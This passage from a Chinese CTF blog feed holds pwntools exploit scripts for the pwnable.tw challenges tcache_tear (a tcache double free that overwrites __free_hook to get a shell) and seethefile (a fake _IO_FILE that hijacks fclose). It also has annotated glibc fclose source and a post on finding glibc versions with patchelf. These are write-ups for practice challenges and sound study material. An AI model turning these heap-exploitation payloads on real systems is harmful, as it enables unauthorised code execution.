io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># create fake chunk</span></span><br><span class="line">    name_addr = <span class="number">0x602060</span></span><br><span class="line">    init_(p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line">    malloc_(<span class="number">0x40</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line">    free_()</span><br><span class="line">    malloc_(<span class="number">0x40</span>, p64(name_addr+<span class="number">0x420</span>))</span><br><span class="line">    malloc_(<span class="number">0x40</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    malloc_(<span class="number">0x40</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free fake chunk</span></span><br><span class="line">    malloc_(<span class="number">0x20</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line">    free_()</span><br><span class="line">    malloc_(<span class="number">0x20</span>, p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">    malloc_(<span class="number">0x20</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    malloc_(<span class="number">0x20</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *0x200C11&quot;)</span></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    ret = info_()</span><br><span class="line">    libc_base = u64(ret[<span class="number">16</span>:<span class="number">24</span>]) - <span class="number">0x3EBCA0</span></span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    malloc_(<span class="number">0x30</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line">    free_()</span><br><span class="line">    malloc_(<span class="number">0x30</span>, p64(free_hook))</span><br><span class="line">    malloc_(<span class="number">0x30</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    malloc_(<span class="number">0x30</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger</span></span><br><span class="line">    malloc_(<span class="number">0x50</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8047000)</span><br><span class="line"></span><br><span class="line">libc_version: Ubuntu GLIBC 2.23-0ubuntu5</span><br></pre></td></tr></table></figure><p>openfile: 输入路径，打开文件，进行了简单的路径过滤</p><p>readfile: 从文件中读取0x18f</p><p>writefile: 输出读取的内容。对文件内容进行了过滤,存在某些字符就不输出</p><p>exit: 读入姓名，这里存在任意长度溢出，可以发现可覆盖fp</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200819184742646.png" alt="image-20200819184742646"></p><h2 id="总体思路-1"><a href="#总体思路-1" class="headerlink" title="总体思路"></a>总体思路</h2><p>利用/proc/self/maps泄露libc base。使用name的溢出构造fake <code>_IO_FILE</code>，将<code>__finish</code>改成system_addr，劫持fclose控制流。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* libio/iofclose.c */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)      <span class="comment">// 去掉_IO_IS_FILEBUF flag</span></span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);                        <span class="comment">// 需要_IO_USER_LOCK 0x8000 flag，</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)      <span class="comment">// 否则会在这里发生段错误</span></span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);                              <span class="comment">// 执行vtable中的__finish</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment"> the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/seethefile/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./origin_seethefile&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># locallibc = &quot;/home/liu/src/how2heap/glibc_versions/2.23/i686_tcache/lib/libc-2.23.so&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span>(<span class="params">filename</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;What do you want to see :&quot;</span>)</span><br><span class="line">    io.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">name</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave your name :&quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    name_addr = <span class="number">0x804B260</span></span><br><span class="line">    open(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">    read()</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    read()</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;0 \n&quot;</span>)</span><br><span class="line">    libc_base = int(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create fake IO_FILE</span></span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p32(name_addr+<span class="number">0x30</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0xc</span></span><br><span class="line">    payload += <span class="string">b&quot;\xff\xdf\xff\xff;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x94</span>, <span class="string">b&quot;\x00&quot;</span>) + p32(name_addr+<span class="number">0x30</span>+<span class="number">0x98</span>)</span><br><span class="line">    payload += p32(system_addr)*<span class="number">0x20</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = b&quot;\x11\x80\x11\x11;sh&quot;.ljust(8, b&quot;\x00&quot;) + p32(system_addr)*6 + p32(name_addr) + p32(0)*28 + p32(name_addr)</span></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b fclose&quot;)</span></span><br><span class="line">    exit(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    io.sendline(<span class="string">&quot;cd /home/seethefile/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><p>这个libc无论是使用自编译的ld(release/2.23/master)，还是ubuntu16.04当前最新的ld，均无法成功运行seethefile。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;tcache-tear&quot;&gt;&lt;a href=&quot;#tcache-tear&quot; class=&quot;headerlink&quot; title=&quot;tcache_tear&quot;&gt;&lt;/a&gt;tcache_tear&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x400000)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libc_version: Ubuntu GLIBC 2.27-3ubuntu1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;程序开始在bss段上读入了一个0x20的名字&lt;/p&gt;
&lt;p&gt;malloc: 输入指定size，分配，指针ptr同样存储在bss，读入size-16的字符，这里字符个数可以溢出&lt;/p&gt;
&lt;p&gt;free: 释放ptr空间，指针悬空，可以double free，程序使用了tcache，且在这个版本释放没有任何的检查&lt;/p&gt;
&lt;p&gt;info: 打印姓名&lt;/p&gt;
&lt;h2 id=&quot;总体思路&quot;&gt;&lt;a href=&quot;#总体思路&quot; class=&quot;headerlink&quot; title=&quot;总体思路&quot;&gt;&lt;/a&gt;总体思路&lt;/h2&gt;&lt;p&gt;利用tcache double free，可以对任意地址进行改写。在name处伪造一个chunk释放到unsorted bin，进行libc base的泄露。将&lt;code&gt;__free_hook&lt;/code&gt;改写为system地址。&lt;/p&gt;
&lt;p&gt;伪造chunk注意绕过free的所有检查。伪造完成的结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  0x421   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  0x21    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  0x21    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;tcache默认最多有64个，第1个是0x20大小，递推第64个也就是0x410。所以将name处伪造为0x420大小。第一个chunk的&lt;code&gt;chunk-&amp;gt;size=0x420|pre_in_use&lt;/code&gt;，避免backward consolidate，第三个chunk的&lt;code&gt;chunk-&amp;gt;size=0x20|pre_in_use&lt;/code&gt;，避免forward consolidate。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>确定glibc版本,以指定glibc运行程序</title>
    <link href="http://hhdx.xyz/2020/08/08/%E4%BB%A5%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/"/>
    <id>http://hhdx.xyz/2020/08/08/%E4%BB%A5%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/</id>
    <published>2020-08-08T01:08:15.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CTF题目中经常会给出libc的文件，首先需要做的就是确定libc的版本，对程序进行针对性的攻击。最直接的确定方法就是直接运行该libc<code>./libc.so.6</code>，但通常由于本机ld版本与libc版本不匹配，发生段错误。</p><p>确定完大版本号还不够，因为就算是同一版本的libc也会有较大的变动。比方说，与最开始的2.29版本相比，gnu libc库的release/2.29/master分支的<code>tcache_perthread_struct-&gt;counts</code>的变量类型都变了；<code>__libc_malloc</code>中取用tcache的判定，也由判断指针是否为空变成了判断counts是否大于0。这些细节很大程度上影响了exploit的书写。</p><p>下面以pwnable.tw re-alloc的<a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc/libc.so.6">libc</a>为例，写一写我的经验。</p><a id="more"></a><h2 id="确定版本号"><a href="#确定版本号" class="headerlink" title="确定版本号"></a>确定版本号</h2><h3 id="有libc"><a href="#有libc" class="headerlink" title="有libc"></a>有libc</h3><p>从libc的字符串确定大版本<code>strings libc.so.6 | grep libc-</code></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200808100344272.png" alt="image-20200808100344272"></p><p>自编译对应版本的glibc使用其ld程序，可以使用how2heap的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_build.sh">编译脚本</a>，<a href="https://hhdx.xyz/2020/06/28/How2heap-fastbin-dup-consolidate-Hitcon2016-SleepyHolder/#%E5%89%8D%E7%BD%AE">使用方法</a>。拷贝ld到libc.so.6的目录。</p><p>使用ld运行libc.so.6得到小版本号，<code>./ld-2.29.so --library-path . ./libc.so.6</code></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200808100856947.png" alt="image-20200808100856947"></p><p>最后，google搜索<code>GLIBC 2.29-0ubuntu2 source</code>就能够得到该libc版本的源码。</p><p>也可以搜索<code>libc6-dbg GLIBC 2.29-0ubuntu</code>获取调试符号信息。</p><h3 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -s --section .comment /path/to/binary</span></span><br></pre></td></tr></table></figure><p>通过编译器版本注释推测libc版本。</p><h2 id="以指定libc运行程序"><a href="#以指定libc运行程序" class="headerlink" title="以指定libc运行程序"></a>以指定libc运行程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> patchelf --set-interpreter ./ld-2.29.so re-alloc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> patchelf --set-rpath <span class="string">&#x27;$ORIGIN/&#x27;</span> re-alloc</span></span><br></pre></td></tr></table></figure><p>patchelf可以通过apt直接安装。</p><p>修改程序ld路径和library查找路径。</p><p><code>$ORIGIN</code>是个特殊的变量，ld会将它替换成程序当前目录</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>如果动态链接发生错误，可以使用<code>LD_DEBUG</code>环境变量打印动态链接日志。</p><p>其变量有<code>files</code>, <code>bindings</code>, <code>libs</code>, <code>versions</code>, <code>reloc</code>, <code>symbols</code>,  <code>statistics</code>, <code>all</code>, <code>help</code></p><p>例如：<code>LD_DEBUG=all ./re-alloc</code></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li><a href="http://shibing.github.io/2016/08/20/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%8Erpath/">http://shibing.github.io/2016/08/20/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%8Erpath/</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;CTF题目中经常会给出libc的文件，首先需要做的就是确定libc的版本，对程序进行针对性的攻击。最直接的确定方法就是直接运行该libc&lt;code&gt;./libc.so.6&lt;/code&gt;，但通常由于本机ld版本与libc版本不匹配，发生段错误。&lt;/p&gt;
&lt;p&gt;确定完大版本号还不够，因为就算是同一版本的libc也会有较大的变动。比方说，与最开始的2.29版本相比，gnu libc库的release/2.29/master分支的&lt;code&gt;tcache_perthread_struct-&amp;gt;counts&lt;/code&gt;的变量类型都变了；&lt;code&gt;__libc_malloc&lt;/code&gt;中取用tcache的判定，也由判断指针是否为空变成了判断counts是否大于0。这些细节很大程度上影响了exploit的书写。&lt;/p&gt;
&lt;p&gt;下面以pwnable.tw re-alloc的&lt;a href=&quot;https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc/libc.so.6&quot;&gt;libc&lt;/a&gt;为例，写一写我的经验。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw re-alloc</title>
    <link href="http://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/"/>
    <id>http://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/</id>
    <published>2020-08-07T14:11:47.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>是一个典型的菜单类程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊      RE Allocator      🍊</span><br><span 